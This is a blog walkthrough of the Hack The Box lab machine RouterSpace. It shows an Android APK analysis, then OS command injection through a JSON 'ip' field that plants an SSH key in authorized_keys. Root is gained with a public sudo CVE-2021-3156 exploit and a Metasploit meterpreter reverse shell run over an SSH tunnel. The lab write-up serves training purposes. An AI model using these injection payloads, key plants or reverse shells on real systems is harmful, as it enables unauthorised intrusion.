---
layout: post
title: Hack The Box - RouterSpace
categories:
  - hackthebox
slug: htb-routerspace
tags:
  - linux
  - android
  - cve
  - privilege escalation
  - rce
---
## Challenge description

[https://app.hackthebox.com/machines/RouterSpace](https://app.hackthebox.com/machines/RouterSpace)

This VM is a medium Linux machine

## Reconnaissance / Enumeration

### Port scanning and service identification

```
$ rustscan -a $ip -r 1-65535 --ulimit 5000 -- -A -sC
[...]
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
| ssh-hostkey: 
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTJG10LrPb/oV0/FaR2FprNXTVtRobg1Jwy5UOJGrzjWqI8lNDf5DDi3ilSdkJZ0+0Rwr4/gKG5UlyvqCz07XrPfnWG+E7NrgpMpVKR4LF9fbX750gxK+hOSco3qQclv3CUTjTzwMgxf0ltyOg6WJvThYQ3CFDDeOc4T27YqQ/VgwBT92PWu6aZgWX2oAn+X8/fdcejGWeumU9b+rufiNt/pQ1dGUz+wkHeb2pIaA4WfEQLHB1xF33rTZuAXFDiKSb35EpPvhuShsMPQv6Q+NfLAiENgdy+UdybSNH6k1gmPHyroSYoXth7Pelpg+38V9SYtvvoxQRqBbaLApEClTnIM/IvQba9vY8VdfKYDGDcgeuPm8ksnOFPrb5L6axwl0K2ngE4VHQBJM0yxIRo5dELswD1c9O1tR2rq6MbW2giPl6dx/xzEbdVV6VO5n/prjsnpEs8YvNmnELrt6mt0FkcJQ9ageN5ji3pecKxKTVY4J71yf4+cVZKwpX8xI5H6E=
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiksdoNGb5HSVU5I64JPbS+qDrMnHaxiFkU+JKFH9VnP69mvgdIM9wTDl/WGjeWV2AJsl7NLQQ4W0goFL/Kz48=
|   256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2psOHQ+E45S1f8MOulwczO6MLHRMr+DYtiyNM0SJw8
80/tcp open  http    syn-ack
|_http-title: RouterSpace
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 4DEC9F02017F347C687806F17B9F0729
|_http-trane-info: Problem with XML parsing of /evox/about
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-14884
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 71
|     ETag: W/"47-JvR+cWIPtJTQukQQfRo3wdT96ls"
|     Date: Tue, 01 Mar 2022 05:21:17 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: a5 F aan n z dAf IC }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-2349
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Tue, 01 Mar 2022 05:21:17 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-94769
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Tue, 01 Mar 2022 05:21:17 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.92%I=7%D=3/1%Time=621DAD4F%P=x86_64-pc-linux-gnu%r(NULL,
SF:29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.92%I=7%D=3/1%Time=621DAD4F%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,31BA,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX
SF:-Cdn:\x20RouterSpace-2349\r\nAccept-Ranges:\x20bytes\r\nCache-Control:\
SF:x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x202021\
SF:x2011:33:57\x20GMT\r\nETag:\x20W/\"652c-17d476c9285\"\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x20
SF:Tue,\x2001\x20Mar\x202022\x2005:21:17\x20GMT\r\nConnection:\x20close\r\
SF:n\r\n<!doctype\x20html>\n<html\x20class=\"no-js\"\x20lang=\"zxx\">\n<he
SF:ad>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<meta
SF:\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x20\x2
SF:0\x20<title>RouterSpace</title>\n\x20\x20\x20\x20<meta\x20name=\"descri
SF:ption\"\x20content=\"\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x2
SF:0content=\"width=device-width,\x20initial-scale=1\">\n\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\n\x20
SF:\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\.mi
SF:n\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/ma
SF:gnific-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20hr
SF:ef=\"css/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"styl
SF:esheet\"\x20href=\"css/themify-icons\.css\">\n\x20\x20")%r(HTTPOptions,
SF:108,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x
SF:20RouterSpace-94769\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text
SF:/html;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\"d-bMed
SF:pZYGrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Tue,\x2001\x20Mar\x202022\x2005:
SF:21:17\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPReque
SF:st,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r
SF:\n")%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(FourOhFourRequest,12D,"HTTP/1\.1\x20200\x20OK\r\nX-
SF:Powered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-14884\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2071\r\nETag:\x2
SF:0W/\"47-JvR\+cWIPtJTQukQQfRo3wdT96ls\"\r\nDate:\x20Tue,\x2001\x20Mar\x2
SF:02022\x2005:21:17\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20a
SF:ctivity\x20detected\x20!!!\x20{RequestID:\x20a5\x20\x20\x20\x20F\x20aan
SF:\x20n\x20\x20z\x20dAf\x20IC\x20\x20}");
```

### Web Enumeration

I browsed the site manually and found a link to download a file named RouterSpace.apk

I tried numerous tools to try and find something else but I didn't

## APK analysis

The file I downloaded is an Android application package. There must be a simpler way of doing it, but here's what I did:

I fired up a Kali Linux VM and installed [Anbox](https://github.com/anbox/anbox) on it. Anbox is a container based Android emulator. I also installed adb, which is a cmdline tool to interact with Android devices.

With my VM connected to HTB's VPN, Anbox device is able to ping the target IP but doesn't resolve the hostname routerspace.htb. Since the emulated device isn't rooted, I was unable to 
edit the hosts file from within the device.

What I had to do is unpack the android image file, edit the hosts file and repack the img:

```bash
$ sudo mv /var/lib/anbox/android.img /tmp/android.img
$ unsquashfs /tmp/android.img
$ echo '2.2.2.2 routerspace.htb' >> /tmp/squashfs-rootfs/system/etc/hosts
$ sudo mksquashfs squashfs-root android.img -b 131072 -comp xz -Xbcj x86
$ sudo mv android.img /var/lib/anbox/android.img
$ sudo systemctl restart anbox-container-manager
```

Now I can test the communication by launching adb shell and ping the hostname:

```bash
$ adb shell

x86_64:/ $ cat /etc/hosts
127.0.0.1       localhost
::1             ip6-localhost
2.2.2.2	routerspace.htb

x86_64:/ $ ping routerspace.htb
PING routerspace.htb (2.2.2.2) 56(84) bytes of data.
64 bytes from routerspace.htb (2.2.2.2): icmp_seq=1 ttl=61 time=23.2 ms
64 bytes from routerspace.htb (2.2.2.2): icmp_seq=2 ttl=61 time=23.2 ms
```

Next thing I need to do is install the application, again, by using adb :

```shell
$ adb install ./RouterSpace.apk
```

Now I can open the newly installed application, click next a couple of times and get to a button to test the connectivity of my router.

![app](/assets/img/htb-routerspace/app1.png "app")

If I click on the button, it works! The application is able to reach out the target. Now I want to know what happened between those two. In a shell on my VM, I started tcpdump to sniff the 'anbox0' interface:

```shell
$ sudo tcpdump -i anbox0 -A -s0 host 2.2.2.2
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on anbox0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
14:52:06.710365 IP 192.168.250.2.53172 > routerspace.htb.http: Flags [S], seq 3244971510, win 64240, options [mss 1460,sackOK,TS val 2575979077 ecr 0,nop,wscale 7], length 0
E..<..@.@..\....

.....P.jU..........w.........
..RE........
14:52:06.733103 IP routerspace.htb.http > 192.168.250.2.53172: Flags [S.], seq 44160001, ack 3244971511, win 65535, options [mss 1460], length 0
E..,....?...

.......P.......jU....	.......
14:52:06.733157 IP 192.168.250.2.53172 > routerspace.htb.http: Flags [.], ack 1, win 64240, length 0
E..(..@.@..o....

.....P.jU.....P....c..
14:52:06.734835 IP 192.168.250.2.53172 > routerspace.htb.http: Flags [P.], seq 1:278, ack 1, win 64240, length 277: HTTP: POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
E..=..@.@..Y....

.....P.jU.....P....x..POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
accept: application/json, text/plain, */*
user-agent: RouterSpaceAgent
Content-Type: application/json
Content-Length: 16
Host: routerspace.htb
Connection: Keep-Alive
Accept-Encoding: gzip

{"ip":"0.0.0.0"}
14:52:06.734982 IP routerspace.htb.http > 192.168.250.2.53172: Flags [.], ack 278, win 65535, length 0
E..(....?...

.......P.......jW.P... l..
14:52:06.769596 IP routerspace.htb.http > 192.168.250.2.53172: Flags [P.], seq 1:253, ack 278, win 65535, length 252: HTTP: HTTP/1.1 200 OK
E..$....?...

.......P.......jW.P...MQ..HTTP/1.1 200 OK
X-Powered-By: RouterSpace
X-Cdn: RouterSpace-42726
Content-Type: application/json; charset=utf-8
Content-Length: 11
ETag: W/"b-ANdgA/PInoUrpfEatjy5cxfJOCY"
Date: Tue, 08 Mar 2022 20:08:05 GMT
Connection: keep-alive

"0.0.0.0\n"
14:52:06.769628 IP 192.168.250.2.53172 > routerspace.htb.http: Flags [.], ack 253, win 63988, length 0
E..(..@.@..m....

.....P.jW.....P....c..
14:52:09.688862 IP 192.168.250.2.53172 > routerspace.htb.http: Flags [F.], seq 278, ack 253, win 63988, length 0
E..(..@.@..l....

.....P.jW.....P....c..
14:52:09.689054 IP routerspace.htb.http > 192.168.250.2.53172: Flags [.], ack 279, win 65535, length 0
E..(....?...

.......P.......jW.P....o..
14:52:09.712759 IP routerspace.htb.http > 192.168.250.2.53172: Flags [F.], seq 253, ack 279, win 65535, length 0
E..(....?...

.......P.......jW.P....n..
14:52:09.712795 IP 192.168.250.2.53172 > routerspace.htb.http: Flags [.], ack 254, win 63988, length 0
E..(..@.@.j.....

.....P.jW.....P...%y..
^C
11 packets captured
11 packets received by filter
0 packets dropped by kernel
```

Between the TCP syn/ack garbage, we can see the actual HTTP requests that are made and the answers (thanks to httpwithoutans)

The application is interacting with an api endpoint on the target machine and send a json payload with an ip of 0.0.0.0. Server replies with "0.0.0.0"

It's time to replay this request in Burp Suite to see what I can get from it. After a lot of fuzzing, I found an os command injection vulnerability.

If I send this payload :

```json
{"ip":"0.0.0.0.;id"}
```

Server replies with :

```r
"0.0.0.0\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\n"
```
Confirming RCE through os command injection

## Exploitation && Foothold

I tried many many many ways to get a reverse shell, but the target just can't reach attacker's machine.

To get a foothold, I had to inject a public key into /home/paul/.ssh/authorized_keys then connect to the target using the private key :

```r
POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
Host: 10.10.11.148
Accept: */*
User-Agent: RouterSpaceAgent
Content-Type: application/json
Content-Length: 609
Connection: close

{"ip":"0.0.0.0;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAA[...redacted...]pmUNA7G/flYc='>>/home/paul/.ssh/authorized_keys"}
```
```shell
$ ssh paul@$ip -i ./id_rsa
paul@routerspace:~$ cat user.txt
(REDACTED)
```

## Privilege Escalation

### Without Metasploit

Like I said before, this VM can't do egress connection. Before trying to send the good old linpeas.sh, I tried some tricks manually : suid binary, cron jobs, sudo version etc..

The box has sudo v1.8.31 installed:

```bash
paul@routerspace:/tmp/h3xit$ sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

Luckily, this version of sudo is vulnerable to [CVE-2021-3156 (Baron Samedit)](https://ubuntu.com/security/CVE-2021-3156)

I tried an [exploit](https://github.com/blasty/CVE-2021-3156):

```bash
paul@routerspace:/tmp/h3xit$ make
rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c

paul@routerspace:/tmp/h3xit$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **
[+] bl1ng bl1ng! We got it!
# id            
uid=0(root) gid=0(root) groups=0(root),1001(paul)
# cat /root/root.txt
(REDACTED)
```

### With Metasploit

For the fun of it, I wanted to find a way to send a metasploit payload and get a meterpreter session, even though the target can't egress.

To do it, I had to setup a reverse port forwarding with ssh :

```bash
$ ssh -R 4444:127.0.0.1:4444 paul@10.10.11.148 -i ./id_rsa
```

Then, with msfvenom, I created a payload that connect to 127.0.0.1 and scp it to the target:

```bash
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o mp
$ scp -i ./id_rsa ./mp paul@2.2.2.2:/tmp/h3xit/mp
```

Now, let's start msfconsole and setup a listener for the payload, then run it from the target:

```bash
# on attacker machine
$ msfconsole
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 127.0.0.1
lhost => 127.0.0.1
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444

# on target
paul@routerspace:~$ /tmp/h3xit/mp &
[1] 49179

# then on attacker machine
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Sending stage (3020772 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:57130 ) at 2022-03-14 00:40:38 +0000
meterpreter> bg
msf6> use exploit/linux/local/sudo_baron_samedit
msf6 exploit(linux/local/sudo_baron_samedit) > set lhost 127.0.0.1
msf6 exploit(linux/local/sudo_baron_samedit) > set session 1
msf6 exploit(linux/local/sudo_baron_samedit) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_railgun_api
[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated. sudo 1.8.31 may be a vulnerable build.
[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
[*] Writing '/tmp/weDXz.py' (763 bytes) ...
[*] Writing '/tmp/libnss_s8xoK/D .so.2' (548 bytes) ...
[*] Sending stage (3020772 bytes) to 127.0.0.1
[+] Deleted /tmp/weDXz.py
[+] Deleted /tmp/libnss_s8xoK/D .so.2
[+] Deleted /tmp/libnss_s8xoK
[*] Meterpreter session 2 opened (127.0.0.1:4444 -> 127.0.0.1:57132 )

meterpreter > shell
Process 49282 created.
Channel 1 created.
id && hostname
uid=0(root) gid=0(root) groups=0(root),1001(paul)
routerspace.htb
```

Thanks to ssh tunelling, I'm able to use almost all metasploit's modules.

Thanks for reading <3

h3x
